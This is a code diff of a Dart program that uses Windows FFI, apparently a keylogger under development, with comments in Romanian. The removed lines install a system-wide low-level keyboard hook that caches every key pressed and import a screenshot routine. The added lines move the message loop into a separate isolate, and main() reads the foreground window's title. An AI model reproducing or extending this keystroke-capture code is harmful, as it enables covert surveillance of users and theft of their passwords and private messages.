@@ -2,34 +2,9 @@ import 'dart:ffi';
 
 import 'package:ffi/ffi.dart';
 
+import 'package:schema/globals.dart';
+import 'package:schema/isolates/msg_isolate/init.dart';
 import 'package:schema/imports.dart';
-import 'package:schema/functions/addToCache.dart';
-import 'package:schema/functions/screenshot.dart';
-
-final hmod = GetModuleHandle(nullptr);
-
-Pointer hhook;
-
-int Callback(int nCode, int wParam, int lParam) {
-  if (nCode == 0) {
-    if (wParam == WM_KEYDOWN) {
-      KBDLLHOOKSTRUCT kbdStruct =
-          Pointer.fromAddress(lParam).cast<KBDLLHOOKSTRUCT>().ref;
-
-      final key = toCorrectKey(wParam, kbdStruct.vKCode);
-
-      addToCache(key);
-    }
-  }
-
-  return CallNextHookEx(hhook, nCode, wParam, lParam);
-}
-
-void setHook() {
-  final lpfn = Pointer.fromFunction<HookCallback>(Callback, 0);
-
-  hhook = SetWindowsHookEx(WH_KEYBOARD_LL, lpfn, hmod, 0);
-}
 
 void main() {
   final int hWnd = GetForegroundWindow();
@@ -46,17 +21,7 @@ void main() {
 
   print(windowText);
 
-  // mai trb sa lucrez la asta
-  // screenshot();
-
-  setHook();
-
-  final msg = MSG.allocate();
-
-  while (GetMessage(msg.addressOf, 0, 0, 0) != 0) {
-    TranslateMessage(msg.addressOf);
-    DispatchMessage(msg.addressOf);
-  }
-
-  print('sal');
+  // nu pot trimite mesaje catre isolate asa ca nu ma obosesc cu o varibila gen
+  // SendPort mainToMSGIsolate
+  initMSGIsolate();
 }
